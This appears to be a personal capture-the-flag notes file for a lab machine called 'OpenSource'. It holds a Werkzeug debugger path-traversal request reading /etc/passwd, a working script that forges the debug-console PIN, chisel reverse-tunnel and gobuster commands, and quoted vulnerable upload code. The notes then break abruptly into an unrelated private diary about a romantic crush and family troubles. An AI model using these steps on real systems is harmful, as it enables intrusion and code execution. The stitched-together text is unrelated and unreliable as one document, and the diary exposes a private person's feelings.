# <span style="color:[COLOR]">Machine #27 OpenSource</span>  


## <span style="color:[COLOR]">Checklist 🤓   

- [x] It might be SSTI
- [x] There could be a way to upload a file onto the web server ( a php file ) and executing it by visiting it.
- [x] The `/console` directory.
- [ ] Try to accomplish port forwarding somehow so that I would be able to open up the local web server much easier.
- [ ] Research the Gitea version.

<br/><br/>


## <span style="color:[COLOR]">What Do We Have? 🤔🤔 
* `'/app/public/uploads/'`.
* The backend is Python.
* It's opensource (obviously).
* I have the code.
* It shows me an error when I press upload without supplying any file.
* I think I can see the error because DEBUG mode is true.
* The upload page seems to be using `Werkzeug`.
* I think we're in a testing environment (Not sure) in the demo that they provided.
* A local web server that I can only access through the container I got into.
* There's a `swagger` data in a file called `swagger.v1.json` which means I have all the api endpoints and there data.
* There's also a home page in the local web server that shows me that there's also a possibility that there exists a login and register page. But life would be so much easier if I can open the website on the browser that's why I'll play a bit with port forwarding.
* A technology used called "Gitea" version 1.16.6

<br/><br/>


## <span style="color:[COLOR]">Random Notes👀
* There are two methods `get_file_name` and `get_unique_file_name` and only the first one is being used.
* What the hell is this!   
```html
   <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "QNJYyPKHPwUQu1DNLaas";
    </script>
```

```
GET /upcloud?__debugger__=yes&cmd=resource&f=../../../../../../../../etc/passwd
```
  
* The code that might get me the pin of the console  
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'flask',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None), //// cc289382c632
]

private_bits = [
    '2485377892360', #2485377892360# bstr(uuid.getnode()),  /sys/class/net/ens33/address ///02:42:AC:11:00:08 
    'cc289382c632'# get_machine_id(), /etc/machine-id  /// cc289382c632
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```  
* I need to generate the PIN but I don't have the username of the user who created the flask process and I also need other info that I should get through some kind of a directory traversal.  

```python

def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")


def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
 
```   

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))  
```



gobuster dir -u 10.10.11.164 -x 'txt,md,jpg,php,html' -w /usr/share/seclists/Discovery/Web-Content/big.txt -b '404,403'






* On my machine I should put the following command `./chisel server -p 8000 --reverse`.
* On the victim `./chisel client 10.10.14.9:8000 R:80:10.10.11.164:3000`
* Then after I do that you just go and open `http://localhost` on the browser and it will open it. YES!!!!
* It's like using a reverse proxy for port forwarding.



`` Soulless_Developer#2022 ``  

* Check this link out *https://git-scm.com/book/en/v2/Git-Internals-Git-Objects*.
<br/><br/>  


## <span style="color:[COLOR]">How Did I Own This Shit 😎🥳  

<br/><br/>



## <span style="color:[COLOR]">Where I Got Stuck?😡😧  


<br/><br/>



## <span style="color:[COLOR]">What Did I learn from this Machine?👀  


<br/><br/>



## <span style="color:[COLOR]">Writeups ✍🏽📓   


<br/><br/>

<!-- @nested-tags:EXAMPLE/OF/NESTED/TAGS-->  


So I wanted to tell you something and it's so complicated that you will misjudge me first
because it looks like it's something its not
here's this thing that I never wanted to face ever in my life
I'm a person who always wanted to have proper friends that you can rely on and have fun with them and that won't stab you in the back ... blah blah etc
I never wanted a guy to love 
I never believed in love I always thought it was overrated
and that's why I always act with guys as my friends because where girls were looking for this perfect guy to get married to and have his children and stay at home cooking and taking care of him I never wanted that.
I even took my not married aunt as my role model
she's an independent woman
never got married
she works in Dubai
and I always had this vibe about her that she's independent 
BUT the problem here I can't control my fucking feelings  
and I don't wanna regret anything 
the problem is...
I think I like Amer and I HATE IT 
Like I really hate it
Because I'm not even sure how he feels 
He's got this politician crap all the time where he doesn't really reveal anything he doesn't want to reveal and it's FUCKING ANNOYING
I HATE HOW I LIKE HIM AND that I can't stop myself from sending him messages
but the messages are not related to me liking him. They're more related to the fact that he has this advice that is right on point 
He doesn't go around saying "It's ok..." and all the similar bullshit other people say
He really gives me an explanation that is not halfassed.
But God I can't help it he's just soo perfect
He's way out of my league like waaaaay out of my league
He's smart, ambitious, philosophical, a nerd and he's a into security and most importantly he BELIEVES in meee
I don't know why honestly but he believes in me more than I believe in myself and I'm not exaggerating
He also has this thing when he's like vulnerable but all manly at the same time and I'm like my heart melts to that and it melts when he laughs at any of my jokes even if it's in a text.

But I also know that girls are way more emotional than guys which could mean two things either he doesn't feel anything or that he's crushing this feeling because he thinks I'm not interested or that he's too proud to say anything 
But also at the same time I DON'T WANT HIM  to have feelings for me too because I'm not thinking of marriage not after a really really long while because tbh I don't think I'm ready to live with another human being let alone a MAN or like imagine me having KIDS I mean God I hate kids and I barely know how to take care of myself let alone another human  

I mean I can't stop telling you about the things I like about him  
the way he's always improving himself and he doesn't just stay the way he is and complain about it
the fact that he's not a sexist bastard like many other men
the fact that he LISTENS to me and it's obvious from what his responses I may be niave abit but I know when someones is listening  

But what's annoying me the most is, is he like that with everyone? Why does he act all chill when he's doing all these things like they're normal shit? I mean I try to play it cool but I still don't get him  
Is there someone who's this good with EVERYONE?  

I mean God I learned alot from him and he made me a better person I must admit  

BUT he's always busy, like really busy, like tarakett koll eldenyah o I liked a guy who's so busy
and he seems like he really is busy
I would've known if he was faking it. It would be pretty obvious  
and the way he kept telling me each time I told him  I will stop texting you, he wouldn't say something sugar coated nooo I know when something is sugar coated he would be like no no no keep sending me stuff  

the guy is a cipher text that I can't decrypt honestly  

and I really really like him. I never liked anyone like that before  
but I want him to like me and I don't want him to like me and it's tearing me apart.  

I mean you know the problems with me and my mom. Well I don't have a great relationship with my dad either so I'm like a person with daddy issues and mommy issues and all issues that's why I think that I could sometimes get attached to someone in a way that could be not mutual because I have issues with my parents if you get what I'm saying  

I could tell that you knew that I liked him. Maybe it's the way I talked about him SHIT I dunno but I knew you knew and didn't say anything because I didn't want to face it.   

Even if I was the one always initiating the conversation he didn't mind it and don't tell me it's because he's a guy and I'm a girl I think